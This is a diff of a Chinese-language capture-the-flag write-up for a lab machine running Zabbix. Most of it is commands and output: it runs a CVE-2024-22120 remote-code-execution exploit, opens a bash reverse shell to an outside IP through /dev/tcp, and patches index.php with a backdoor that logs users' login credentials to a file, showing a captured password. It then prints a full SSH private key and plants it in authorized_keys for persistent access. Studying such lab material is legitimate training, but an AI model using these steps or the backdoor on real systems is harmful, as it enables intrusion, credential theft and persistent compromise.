@@ -71,11 +71,221 @@ https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py
 #### 左下角就会显示http://zabbix.watcher.vl/hostinventories.php?hostid=10084
 #### 主机 ID 为 10084 ，这是“库存”中的 Zabbix 服务器。我们将对 cookie 进行 base64 解码，并使用 sessionid 键。
 #### Fn12 -> Storage -> Value 粘贴cooike
-```
-[★]$ echo 'eyJzZXNzaW9uaWQiOiI4MWI3ZThiMDBkMWUyYWQ5Yjg2ZmI3YjFlMGIwZTdmYSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NzI2MzQ5NjMsInNpZ24iOiJkNGRjYjhkNzdjY2NmYmY0YzMyOWU3MTQxMTJhYzNmNWE2NmIxOWRiOTIxOGZkODA0YzI4ZTJkNmE0Yzc1MmU1In0%3D' | base64 -d
-{"sessionid":"81b7e8b00d1e2ad9b86fb7b1e0b0e7fa","serverCheckResult":true,"serverCheckTime":1772634963,"sign":"d4dcb8d77cccfbf4c329e714112ac3f5a66b19db9218fd804c28e2d6a4c752e5"}base64: invalid input
-```
+#### 需要点击'Zabbix server' ，才会出现payload需要的cookie
 #### base64: invalid input的原因是       ’ %3D = URL 编码后的 =‘
 ```
-[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid d4dcb8d77cccfbf4c329e714112ac3f5a66b19db9218fd804c28e2d6a4c752e5 --hostid 10084
+[★]$ echo 'eyJzZXNzaW9uaWQiOiJmMGU3NGZjNzY4MzVlMTAzODRhMTZhODQ2OTFkN2E2ZCIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NzI2Mzc1MTIsInNpZ24iOiI0ZTMwMGE0ZmUyOTE2NTY4OGI4YTllOWI5MWE1YWU0M2YyZjYwZWM4OTRhOWU4YTM0ODgzZmM3M2YyMDE2ZTQ4In0=' | base64 -d
+{"sessionid":"f0e74fc76835e10384a16a84691d7a6d","serverCheckResult":true,"serverCheckTime":1772637512,"sign":"4e300a4fe29165688b8a9e9b91a5ae43f2f60ec894a9e8a34883fc73f2016e48"}
+```
+```
+[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid f0e74fc76835e10384a16a84691d7a6d --hostid 10084
+(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
+[zabbix_cmd]>>:  whoami
+zabbix
+
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &
+```
+```
+[★]$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.16.76] 41666
+bash: cannot set terminal process group (8073): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@watcher:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+zabbix@watcher:/$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+┌─[us-dedivip-1]─[10.10.15.132]─[syareya55@htb-k8y76ua84j]─[~]
+└──╼ [★]$ stty raw -echo;fg
+nc -lvnp 1337
+             export TERM=xterm
+zabbix@watcher:/$ cat user.txt
+```
+### Privilege Escalation
+```
+zabbix@watcher:/usr/share/zabbix$ cat index.php
+<SNIP>
+// login via form
+if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
+	CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
+
+	if (CWebUser::$data['autologin'] != $autologin) {
+		API::User()->update([
+			'userid' => CWebUser::$data['userid'],
+			'autologin' => $autologin
+		]);
+	}
+
+	$redirect = array_filter([CWebUser::isGuest() ? '' : $request, CWebUser::$data['url'], CMenuHelper::getFirstUrl()]);
+	redirect(reset($redirect));
+}
+</SNIP>
+```
+#### 手动插入后门
+```
+zabbix@watcher:/usr/share/zabbix$ vim index.php
+zabbix@watcher:/usr/share/zabbix$ cat index.php
+<SNIP>
+// login via form
+if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
+	CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
+	
+	// Backdoor
+	  $file = fopen("creds.txt", "a+");
+ 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n");
+ 	header("Location: http://127.0.0.1/index.php");
+ 	fclose($file);	  
+
+	
+	if (CWebUser::$data['autologin'] != $autologin) {
+		API::User()->update([
+			'userid' => CWebUser::$data['userid'],
+			'autologin' => $autologin
+		]);
+	}
+
+	$redirect = array_filter([CWebUser::isGuest() ? '' : $request, CWebUser::$data['url'], CMenuHelper::getFirstUrl()]);
+	redirect(reset($redirect));
+}
+</SNIP>
+
+
+zabbix@watcher:/usr/share/zabbix$ cat creds.txt
+Username: Frank | Password: R%)3S7^Hf4TBobb(gVVs
+
+```
+#### 该用户在机器上不存在。检查开放端口时，我们发现了 8111 端口，该端口在 Nmap 扫描中未被检测到。
+```
+zabbix@watcher:/$ ss -tulnp
+Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess                                                                                                                                                                                           
+udp   UNCONN 0      0           127.0.0.53%lo:53         0.0.0.0:*                                                                                                                                                                                                     
+udp   UNCONN 0      0                 0.0.0.0:68         0.0.0.0:*                                                                                                                                                                                                     
+udp   UNCONN 0      0               127.0.0.1:323        0.0.0.0:*                                                                                                                                                                                                     
+udp   UNCONN 0      0                   [::1]:323           [::]:*                                                                                                                                                                                                     
+tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      4096              0.0.0.0:10051      0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      4096              0.0.0.0:10050      0.0.0.0:*    users:(("zabbix_agentd",pid=725,fd=4),("zabbix_agentd",pid=724,fd=4),("zabbix_agentd",pid=723,fd=4),("zabbix_agentd",pid=722,fd=4),("zabbix_agentd",pid=721,fd=4),("zabbix_agentd",pid=704,fd=4))
+tcp   LISTEN 0      128               0.0.0.0:22         0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      511               0.0.0.0:80         0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*                                                                                                                                                                                                     
+tcp   LISTEN 0      50                      *:36099            *:*                                                                                                                                                                                                     
+tcp   LISTEN 0      50     [::ffff:127.0.0.1]:50604            *:*                                                                                                                                                                                                     
+tcp   LISTEN 0      1      [::ffff:127.0.0.1]:8105             *:*                                                                                                                                                                                                     
+tcp   LISTEN 0      100    [::ffff:127.0.0.1]:8111             *:*                                                                                                                                                                                                     
+tcp   LISTEN 0      128                  [::]:22            [::]:*                                                                                                                                                                                                     
+tcp   LISTEN 0      50     [::ffff:127.0.0.1]:9090             *:*
+```
+#### 我们可以使用 ssh-keygen 创建一对 SSH 密钥，并执行本地端口转发以访问 8111 TCP 端口。
+```
+zabbix@watcher:/$ cd /var/lib/zabbix
+zabbix@watcher:/var/lib/zabbix$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+zabbix@watcher:/var/lib/zabbix$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/var/lib/zabbix/.ssh/id_rsa): Created
+Enter passphrase (empty for no passphrase): 123qwe
+Enter same passphrase again: 
+Your identification has been saved in Created
+Your public key has been saved in Created.pub
+The key fingerprint is:
+SHA256:W59rBlqwCgF5T3IJohk74yzeHgh0/+cgr/sc4BGqdxc zabbix@watcher.vl
+The key's randomart image is:
++---[RSA 3072]----+
+|. .... .         |
+| =o.o +          |
+|*. + *           |
+|+o. + o .        |
+|oo . = ESo.      |
+|+ + o + ooo. .   |
+| + + = *.+ .o    |
+|  o o * *   o.   |
+|   . o++ . o.    |
++----[SHA256]-----+
+zabbix@watcher:/var/lib/zabbix$
+zabbix@watcher:/var/lib/zabbix$ ls
+Created  Created.pub  user.txt
+Created directory '/var/lib/zabbix/.ssh'.
+```
+
+_______________
+```
+[★]$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.16.76] 43150
+bash: cannot set terminal process group (21788): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@watcher:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+zabbix@watcher:/$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+┌─[us-dedivip-1]─[10.10.15.132]─[syareya55@htb-k8y76ua84j]─[~]
+└──╼ [★]$ stty raw -echo;fg
+nc -lvnp 1337
+             export TERM=xterm
+zabbix@watcher:/$ cd /var/lib/zabbix
+zabbix@watcher:/var/lib/zabbix$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+zabbix@watcher:/var/lib/zabbix$ export TERM=xterm
+zabbix@watcher:/var/lib/zabbix$ stty rows 40 columns 120
+zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh
+zabbix@watcher:/var/lib/zabbix$ ls
+user.txt
+zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N ""
+Generating public/private rsa key pair.
+Your identification has been saved in /var/lib/zabbix/.ssh/id_rsa
+Your public key has been saved in /var/lib/zabbix/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:8wkKrVsAPfq2G1CW+Tl1WY6nvfRQITh9vIaVo1xvH+g zabbix@watcher.vl
+The key's randomart image is:
++---[RSA 2048]----+
+|           oo... |
+|   . o    o=..B. |
+|  . B   . +oo*o+ |
+|   = + o . ++oo.o|
+|  o o = S . =. .o|
+|   o + o + o E  .|
+|    = o   o . .  |
+|   . =           |
+|    +.           |
++----[SHA256]-----+
+zabbix@watcher:/var/lib/zabbix$ ls
+user.txt
+zabbix@watcher:/var/lib/zabbix$ cd .ssh
+zabbix@watcher:/var/lib/zabbix/.ssh$ ls
+id_rsa	id_rsa.pub
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAmm/ce5vjqisL297Q9ddTDX4y9bC+7tQ3qw2GbZNfnLeeBFnq+dDG
+Op48A2FQEveHTgewP2cjpFEGSIk5BViwobzJ81UU905rxgAZzlc4yabp8hUqOAJFks06Ok
++hUjgIBniRv5VYgRgCOMmbp3WB4is4pENpeWmGiVwiOB15QG7yq67mYHy4L0K3rTJyC8Xo
+jqMdsHzHCj/QdeB52ZKgWtPW/SJpkDin5wAQ466UbViX4VVDiKCJ35jCVT5Lw3w9Dwal04
+st0GO3DR4nPuJ65XVRDfQ/LIW/sEHevRReuzruWrr5//4gajaLfOtIy9VfdBSPQlRTOKeD
+TEzvD0opnQAAA8hMLT7nTC0+5wAAAAdzc2gtcnNhAAABAQCab9x7m+OqKwvb3tD111MNfj
+L1sL7u1DerDYZtk1+ct54EWer50MY6njwDYVAS94dOB7A/ZyOkUQZIiTkFWLChvMnzVRT3
+TmvGABnOVzjJpunyFSo4AkWSzTo6T6FSOAgGeJG/lViBGAI4yZundYHiKzikQ2l5aYaJXC
+I4HXlAbvKrruZgfLgvQretMnILxeiOox2wfMcKP9B14HnZkqBa09b9ImmQOKfnABDjrpRt
+WJfhVUOIoInfmMJVPkvDfD0PBqXTiy3QY7cNHic+4nrldVEN9D8shb+wQd69FF67Ou5auv
+n//iBqNot860jL1V90FI9CVFM4p4NMTO8PSimdAAAAAwEAAQAAAQANARdZRz6r8RT+Diyd
+TuTc8X/8BUaGmNMZMbnclzjJWwLQzfuFzqkqfXGDPVn/Rt2bWfVi2V38c6AqUne9NgMlk1
+6UAVmTG4TittZ1dA3BmS8A5fxYnARcwLBDAbqNUE+Ir/Vh4wMBV9K0EnHrb28g6s/JsS17
+/kFIZrww6nZv0OZWMktb+x+IH0o75m1CEIzH3IHLMjG7s/hwHZa0Y+Yg4fp4hmkGK/fOSO
+kz+FMWyJmEl1PWnFAeVBhrFm3CKNMMPt2CCZ6O0ZlS8+Tp6VRxUVtW6a6rV8fmWFfC45Q3
+o2sSFzOfpD2/411qyN8a5Zug4VMubVcMz/jxwblP85GXAAAAgBDSf0zecMsiLr0jc7vLtc
+sR6KyITL0TmCqgEBBPZMjLhe5+9PRcoYAIHznHn5MWpfmojFAsYgFwMSMNkPvAMNqEtBJy
+Ncre+UY9Tx2tcriMB8sdVaS0XUXJLnEgXE2ORZ3iTSnrRSL7wDpKZbxpUG16PKDHNOnZB5
+KHL6oGg/cKAAAAgQDOyH5W8F7csJeEmDNvm4ieIuzZYVnCpOAbyqVjJGoQOmtjSNLezqTX
+O6VkfmS3/4GY+sR6WLsEqE3UCXDVpHamEYKKZqXFVGytM8IiwHFoT08yWrcN+IG9aO/eru
+OWq/3sobO+eMtXsE4NSjYbOVbRDBekHaiJf/Fs8wKbEkLsVwAAAIEAvzHcLOThLfDLhDVS
+dO2Lz90wukqLd1qOQEAprYVHnq4HqtCXMC1RM3GivW0Upk+P3eK+4IYasfmniS6Pp5dmBh
+b29KAI2GDdxdb7xAWKITE876wGQ2js030wu+v8W0Qpj1N4HHpJAnmbbQzdH9oKR6+jehSe
+i3upaTxtpoHM4SsAAAARemFiYml4QHdhdGNoZXIudmwBAg==
+-----END OPENSSH PRIVATE KEY-----
+zabbix@watcher:/var/lib/zabbix/.ssh$ 
+
+
+```
+```
+[★]$ chmod 600 id_rsa
+[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
 ```
